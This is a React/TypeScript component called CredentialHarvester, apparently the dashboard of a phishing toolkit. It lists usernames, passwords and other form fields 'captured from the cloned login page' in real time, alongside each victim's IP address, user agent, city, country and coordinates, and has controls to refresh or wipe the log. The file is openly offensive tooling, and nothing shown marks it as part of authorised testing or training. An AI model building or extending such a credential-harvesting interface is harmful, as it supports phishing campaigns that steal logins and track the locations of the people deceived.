
'use client';

import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Trash2, ShieldAlert, RefreshCw } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { Badge } from './ui/badge';
import { ScrollArea } from './ui/scroll-area';

export type CapturedCredential = {
    timestamp: string; // ISO String
    ipAddress?: string;
    userAgent?: string;
    city?: string;
    country?: string;
    latitude?: number;
    longitude?: number;
    [key: string]: any; // Allows for arbitrary keys from form fields
};

type CredentialHarvesterProps = {
    credentials: CapturedCredential[];
    onClear: () => void;
    onRefresh: () => void;
};

export function CredentialHarvester({ credentials, onClear, onRefresh }: CredentialHarvesterProps) {
    const { toast } = useToast();

    const handleClear = () => {
        onClear();
        toast({
            title: 'Log Cleared',
            description: 'The credential log has been wiped.',
        });
    }

    const formatLabel = (key: string) => {
        if (key === 'ipAddress') return 'IP Address';
        if (key === 'userAgent') return 'User Agent';
        return key.charAt(0).toUpperCase() + key.slice(1);
    }
    
    // Fields to exclude from the main credentials loop
    const metaFields = ['timestamp', 'ipAddress', 'userAgent', 'city', 'country', 'latitude', 'longitude', 'source'];

    return (
        <Card className="flex flex-col h-full">
            <CardHeader>
                 <div className="flex justify-between items-start">
                  <div className="flex items-center gap-3">
                      <ShieldAlert className="h-6 w-6 text-destructive" />
                      <CardTitle>Credential Harvester</CardTitle>
                  </div>
                  {credentials.length > 0 && <Badge variant="destructive">{credentials.length} Captured</Badge>}
                </div>
                <CardDescription>
                    Credentials captured from the cloned login page are displayed here in real-time.
                </CardDescription>
            </CardHeader>
            <CardContent className="flex-grow p-0">
                 <ScrollArea className="h-96 w-full">
                    <div className="p-6">
                        {credentials.length === 0 ? (
                            <div className="flex items-center justify-center h-full text-center text-muted-foreground pt-16">
                                No credentials captured yet.
                            </div>
                        ) : (
                            <div className="space-y-4">
                                {credentials.slice().reverse().map((cred, index) => (
                                    <div key={cred.timestamp + index} className="p-4 rounded-lg border bg-primary/20">
                                        <div className="flex justify-between items-start mb-2">
                                            <p className="text-sm text-muted-foreground">
                                                {new Date(cred.timestamp).toLocaleString()}
                                            </p>
                                            <Badge variant="outline">{cred.ipAddress}</Badge>
                                        </div>
                                        <div className="space-y-1 font-mono text-xs">
                                            {Object.entries(cred)
                                                .filter(([key]) => !metaFields.includes(key))
                                                .map(([key, value]) => (
                                                    <div key={key} className="grid grid-cols-3">
                                                        <strong className="font-sans col-span-1 text-muted-foreground font-medium">{formatLabel(key)}:</strong>
                                                        <span className="col-span-2 break-all">{String(value)}</span>
                                                    </div>
                                                ))}
                                            <hr className="border-border my-2"/>
                                            <div className="grid grid-cols-3">
                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">Location:</strong>
                                                <span className="col-span-2 break-all">{cred.city || 'N/A'}, {cred.country || 'N/A'}</span>
                                            </div>
                                             <div className="grid grid-cols-3">
                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">Coords:</strong>
                                                <span className="col-span-2 break-all">{cred.latitude ? `${cred.latitude}, ${cred.longitude}`: 'N/A'}</span>
                                            </div>
                                             <div className="grid grid-cols-3">
                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">User Agent:</strong>
                                                <span className="col-span-2 break-all">{cred.userAgent}</span>
                                            </div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                </ScrollArea>
            </CardContent>
            <CardFooter className="border-t pt-6 justify-between">
                <Button variant="outline" onClick={onRefresh}>
                    <RefreshCw className="mr-2 h-4 w-4" />
                    Refresh Log
                </Button>
                <Button variant="destructive" onClick={handleClear} disabled={credentials.length === 0}>
                    <Trash2 className="mr-2 h-4 w-4" />
                    Clear Log
                </Button>
            </CardFooter>
        </Card>
    );
}
